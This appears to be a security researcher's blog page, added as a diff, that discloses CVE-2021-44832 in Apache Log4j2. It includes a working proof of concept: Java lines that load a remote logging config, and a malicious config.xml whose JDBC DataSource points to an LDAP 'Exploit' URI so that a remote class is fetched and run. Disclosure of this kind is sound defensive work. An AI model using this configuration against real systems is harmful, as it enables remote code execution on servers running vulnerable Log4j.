@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta property="og:description" content="Security research blog">
+    <meta property="og:type" content="website">
+    <meta name="description" content="Security research blog">
+    <meta name="keyword"  content="security,research,vulnerability,blog,vulnerabilites">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <title>
+        
+        Deserialization attack via JDBC Appender in log4j - YNizry
+        
+    </title>
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/aircloud.css">
+
+    
+<link rel="stylesheet" href="/css/gitment.css">
+
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_28hi1hpxx24.css" rel="stylesheet" type="text/css">
+
+    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+    <style>
+    .googleicon {
+        vertical-align: middle;
+        font-size: 16px;
+        font-style: normal;
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;    
+        color: #999999;
+        }
+    </style>
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+
+    
+  
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-SCK9223GY8"></script>
+    <script>
+      window.dataLayer = window.dataLayer || []
+      function gtag() {
+        dataLayer.push(arguments)
+      }
+      gtag('js', new Date())
+      gtag('config', 'G-SCK9223GY8')
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="Yaniv Nizry Blogs" type="application/atom+xml">
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i>  </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar radius">
+            <img src="/img/avatar.webp" />
+        </div>
+        <div class="name">
+            <i>Yaniv Nizry</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>Blogs</span>
+                </a>
+            </li>
+            <li >
+                <a href="/advisories">
+                    <i class="material-icons googleicon">speaker_notes</i>
+                    <span>Advisories</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archive">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>Archives</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>About</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>Search</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Summary"><span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Product"><span class="toc-text">Product</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Impact"><span class="toc-text">Impact</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Steps-to-reproduce"><span class="toc-text">Steps to reproduce</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Expected-result"><span class="toc-text">Expected result:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Remediation"><span class="toc-text">Remediation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Credit"><span class="toc-text">Credit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Resources"><span class="toc-text">Resources</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-bg" id="search-bg"></div>
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i>  </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        <div class="post-container">
+    <div class="post-title">
+        Deserialization attack via JDBC Appender in log4j    
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2021-12-29 23:00:00</span></span>
+        
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#java" title="java">java</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#deserialization" title="deserialization">deserialization</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#log4j" title="log4j">log4j</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#log4j2" title="log4j2">log4j2</a>
+        <span>/</span>
+        
+        </span>
+        
+        
+
+        
+        <span class="attr">/
+        
+        <a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2021-44832" title="CVE-2021-44832">CVE-2021-44832</a>
+        <span>/</span>
+        
+        </span>
+        
+        
+        <!--<span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>-->
+    </span>
+    </span>
+    </div>
+
+    <div class="post-source-meta post-meta">
+        
+            <a target="_blank" rel="noopener" href="https://advisory.checkmarx.net/advisory/CX-2021-4814/">Source</a>
+        
+    </div>
+    <div class="post-content no-indent">
+        <h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>Apache Log4j2 versions 2.0-beta7 through 2.17.0 (excluding security fix releases 2.3.2 and 2.12.4) are vulnerable to a Arbitrary Code Execution attack where an attacker with permission to modify the logging configuration file can construct a malicious configuration using JDBC Appender with a data source referencing a JNDI URI which can execute remote code. This issue is fixed by limiting JNDI data source names to the java protocol in Log4j2 versions 2.17.1, 2.12.4, and 2.3.2.</p>
+<h2 id="Product"><a href="#Product" class="headerlink" title="Product"></a>Product</h2><p>Apache Log4j2 versions 2.0-beta7 through 2.17.0 (excluding security fix releases 2.3.2 and 2.12.4).</p>
+<h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>In case an attacker can modify the logging configuration (due to fetching remote configuration feature in log4j this opens different attack vectors, such as MITM, DNS poisoning, lateral movement after gaining access to a storage node) an Arbitrary Code Execution could be achieved.</p>
+<h2 id="Steps-to-reproduce"><a href="#Steps-to-reproduce" class="headerlink" title="Steps to reproduce"></a>Steps to reproduce</h2><p>Using the same LDAP server as done in the CVE-2021-44228 PoC, all we need to do is to run: </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(<span class="string">&quot;log4j2.configurationFile&quot;</span>,<span class="string">&quot;http://127.0.0.1:8888/config.xml&quot;</span>); </span><br><span class="line">System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>,<span class="string">&quot;true&quot;</span>); </span><br><span class="line"><span class="keyword">final</span> Logger logger = LogManager.getLogger(log4j.class); </span><br></pre></td></tr></table></figure>
+
+<p>And to serve the following config.xml: </p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;error&quot;</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">JDBC</span> <span class="attr">name</span>=<span class="string">&quot;databaseAppender&quot;</span> <span class="attr">tableName</span>=<span class="string">&quot;dbo.application_log&quot;</span>&gt;</span> </span><br><span class="line">            <span class="tag">&lt;<span class="name">DataSource</span> <span class="attr">jndiName</span>=<span class="string">&quot;ldap://127.0.0.1:1389/Exploit&quot;</span> /&gt;</span> </span><br><span class="line">            <span class="tag">&lt;<span class="name">Column</span> <span class="attr">name</span>=<span class="string">&quot;eventDate&quot;</span> <span class="attr">isEventTimestamp</span>=<span class="string">&quot;true&quot;</span> /&gt;</span> </span><br><span class="line">            <span class="tag">&lt;<span class="name">Column</span> <span class="attr">name</span>=<span class="string">&quot;level&quot;</span> <span class="attr">pattern</span>=<span class="string">&quot;%level&quot;</span> /&gt;</span> </span><br><span class="line">            <span class="tag">&lt;<span class="name">Column</span> <span class="attr">name</span>=<span class="string">&quot;logger&quot;</span> <span class="attr">pattern</span>=<span class="string">&quot;%logger&quot;</span> /&gt;</span> </span><br><span class="line">            <span class="tag">&lt;<span class="name">Column</span> <span class="attr">name</span>=<span class="string">&quot;message&quot;</span> <span class="attr">pattern</span>=<span class="string">&quot;%message&quot;</span> /&gt;</span> </span><br><span class="line">            <span class="tag">&lt;<span class="name">Column</span> <span class="attr">name</span>=<span class="string">&quot;exception&quot;</span> <span class="attr">pattern</span>=<span class="string">&quot;%ex&#123;full&#125;&quot;</span> /&gt;</span> </span><br><span class="line">        <span class="tag">&lt;/<span class="name">JDBC</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;warn&quot;</span>&gt;</span> </span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;databaseAppender&quot;</span>/&gt;</span> </span><br><span class="line">        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<h3 id="Expected-result"><a href="#Expected-result" class="headerlink" title="Expected result:"></a>Expected result:</h3><p>When initializing the logger object, a request to the config.xml will be made. In the loading process, an attempt to load the DataSource will make a request to the LDAP server that will then redirect to a malicious class. In the end, the arbitrary class will be deserialized and run. </p>
+<h2 id="Remediation"><a href="#Remediation" class="headerlink" title="Remediation"></a>Remediation</h2><p>Update log4j to one of the fixed versions.</p>
+<h2 id="Credit"><a href="#Credit" class="headerlink" title="Credit"></a>Credit</h2><p>This issue was discovered and reported by Checkmarx Security Researchers <a target="_blank" rel="noopener" href="https://twitter.com/ynizry">Yaniv Nizry</a> and <a target="_blank" rel="noopener" href="https://twitter.com/liad__levy">Liad Levy</a>.</p>
+<h2 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://lists.apache.org/thread/kflcpnczh2y0vhfxn5fd0fnxb80l5kwm">Release Candidate</a> </li>
+<li><a target="_blank" rel="noopener" href="https://github.com/apache/logging-log4j2/commit/05db5f9527254632b59aed2a1d78a32c5ab74f16">Commit</a></li>
+<li><a target="_blank" rel="noopener" href="https://checkmarx.com/blog/cve-2021-44832-apache-log4j-2-17-0-arbitrary-code-execution-via-jdbcappender-datasource-element/">Blog Post</a></li>
+</ol>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+        <div id="lv-container"></div>
+        <div class="giscus"></div>
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        <li>
+            <a target="_blank" href="https://twitter.com/YNizry">
+                            <span class="fa-stack fa-lg">
+                                <i class="iconfont icon-twitter"></i>
+                            </span>
+            </a>
+        </li>
+        
+        
+
+        
+
+        
+
+        
+        <li>
+            <a target="_blank"  href="https://github.com/yaniv-git">
+                            <span class="fa-stack fa-lg">
+                                <i class="iconfont icon-github"></i>
+                            </span>
+            </a>
+        </li>
+        
+
+        
+        <li>
+            <a target="_blank"  href="https://www.linkedin.com/in/yaniv-n-8b4a76193">
+                            <span class="fa-stack fa-lg">
+                                <i class="iconfont icon-linkedin"></i>
+                            </span>
+            </a>
+        </li>
+        
+
+    </ul>
+    
+    <p>
+    Theme <a target="_blank" rel="noopener" href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+<script src="/js/index.js"></script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+</html>
